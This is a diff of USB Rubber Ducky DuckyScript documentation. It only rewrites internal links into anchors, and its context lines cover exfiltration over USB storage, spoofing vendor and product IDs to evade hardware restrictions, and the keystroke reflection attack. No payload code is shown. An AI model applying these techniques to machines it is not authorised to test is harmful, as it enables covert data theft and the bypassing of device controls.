-In addition to creating your own variables using the `VAR` command, DuckyScript 3 provides many built-in internal variables. These variables exist automatically and are prepended with dollar sign underscore ("`$_`"). These internal variables will be described in full in sections ahead relevant to their individual usage. For a complete list you may find them [listed in the quick reference.](/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference.md#internal-variables)
+In addition to creating your own variables using the `VAR` command, DuckyScript 3 provides many built-in internal variables. These variables exist automatically and are prepended with dollar sign underscore ("`$_`"). These internal variables will be described in full in sections ahead relevant to their individual usage. For a complete list you may find them [listed in the quick reference.](#internal-variables)
 
 #### Avoiding Errors
 
@@ -4576,7 +4576,7 @@ This section will cover the two most common exfiltration techniques, as well as 
 
 Physical medium encompasses exfiltration over USB ([T1052.001](https://attack.mitre.org/techniques/T1052/001)), and much like it sounds may simply involve copying data to a mass storage "flash drive" — which the USB Rubber Ducky may function by using the `ATTACKMODE STORAGE` command.
 
-The USB Rubber Ducky excels at small file exfiltration via USB mass storage due to its convenience, and the fact that it may evade hardware installation limiting mitigation techniques relying on hardware identifiers. See the section on [spoofing Vendor ID and Product ID](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md#spoofing-vendor-and-product-ids).
+The USB Rubber Ducky excels at small file exfiltration via USB mass storage due to its convenience, and the fact that it may evade hardware installation limiting mitigation techniques relying on hardware identifiers. See the section on [spoofing Vendor ID and Product ID](#spoofing-vendor-and-product-ids).
 
 ##### Example
 
@@ -4650,7 +4650,7 @@ This example is naive. Use with caution. Keep in mind that most networks block S
 
 #### The Keystroke Reflection Attack
 
-As described in the previous section on [lock keys](/hak5-usb-rubber-ducky/advanced-features/lock-keys.md), the USB Rubber Ducky features a USB [HID OUT endpoint](/hak5-usb-rubber-ducky/advanced-features/lock-keys.md#end-points-and-control-codes) which may accept control codes for the purposes of toggling the lock key LED indicators.
+As described in the previous section on [lock keys](#lock-keys), the USB Rubber Ducky features a USB [HID OUT endpoint](#end-points-and-control-codes) which may accept control codes for the purposes of toggling the lock key LED indicators.
 
 In much the same way **Keystroke Injection attacks** take advantage of the keyboard-computer trust model, **Keystroke Reflection attacks** take advantage of the keyboard-computer architecture.
 
@@ -4906,7 +4906,7 @@ REM This will type "FALSE".
 
 For use with DEFINE for more configurable and efficient payloads
 
-As covered in the [Constants section](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/constants.md), `DEFINE` can be used to declare constants used throughout your payloads. Using `DEFINE` and some additional commands described below we can gain even more control over the source code that get included into your `inject.bin`during compilation.
+As covered in the [Constants section](#constants), `DEFINE` can be used to declare constants used throughout your payloads. Using `DEFINE` and some additional commands described below we can gain even more control over the source code that get included into your `inject.bin`during compilation.
 
 ##### What problem does this solve?
 
@@ -5176,8 +5176,8 @@ Recently Microsoft has updated Notepad on Windows 11; many sources (including th
 
 First, make sure you've read up on the basics -- you will likely find the answer to your problem or question here:
 
-* [Quick start guide](/hak5-usb-rubber-ducky/unboxing-quack-start-guide.md)
-* [Hello world!](/hak5-usb-rubber-ducky/ducky-script-basics/hello-world.md)
+* Quick start guide
+* Hello world!
 
 ##### Payload not working as intended
 
@@ -5251,7 +5251,7 @@ USB passthrough is a feature in desktop virtualization that allows USB devices t
 
 Most virtualization software allows you to specify which USB devices will automatically connect to the host operating system, and which will be connected to the guest virtual machine.
 
-USB [VID (Vendor ID) and PID (Product ID)](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md#vid-and-pid-overview) values are unique identifiers assigned to USB devices. By specifically selecting certain VID and PID values to connect to the guest VM, and using these values in conjunction with the [ATTACKMODE](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md) command when developing payloads, you may ensure that on attachment the USB Rubber Ducky will connect to the guest virtual machine.
+USB [VID (Vendor ID) and PID (Product ID)](#vid-and-pid-overview) values are unique identifiers assigned to USB devices. By specifically selecting certain VID and PID values to connect to the guest VM, and using these values in conjunction with the ATTACKMODE command when developing payloads, you may ensure that on attachment the USB Rubber Ducky will connect to the guest virtual machine.
 
 ![Example of a USB Rubber Ducky configured to automatically connect to a Windows 11 virtual machine using the Parallels desktop virtualization software.](https://4019606163-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MiIkRK_o3RBhZzUkrzr%2Fuploads%2F5pPPaJVr9CXRpY0JDz0w%2Fimage.png?alt=media&amp;token=38dd5137-b197-4895-97e0-644d8802f516)
 
